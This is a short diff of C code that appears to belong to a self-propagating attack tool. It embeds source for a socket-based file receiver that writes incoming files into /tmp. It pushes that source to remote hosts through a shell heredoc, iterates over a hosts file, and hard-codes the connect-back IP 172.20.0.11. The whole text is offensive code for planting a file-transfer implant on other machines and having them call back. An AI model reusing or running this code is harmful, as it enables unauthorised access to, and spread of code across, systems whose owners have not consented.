@@ -77,6 +77,7 @@ read(s,fn,len);fn[len]=0;sprintf(p,\"/tmp/%%s\",fn);o=fopen(p,\"w\");\
 receive_int(&fs,s);while(fs>0){n=read(s,b,2047);if(n<=0)break;b[n]=0;\
 fputs(b,o);fs-=n;}fclose(o);free(fn);send_int(i,s);}break;}close(s);return 0;}";
 
+    strcpy(my_ip, "172.20.0.11");
     sprintf(formatted_source, file_contents, my_ip);
 
     write_to_sock(sock, "cat > /tmp/receive_file.c << 'EOF'\n");
@@ -176,7 +177,7 @@ int main()
     char ip[MAX_IP_LEN];
     char my_ip[MAX_IP_LEN];
 
-    get_local_ip(my_ip);
+    get_local_ip(my_ip); 
 
     while (1) {
         fp = fopen(HOSTS_FILE, "r");
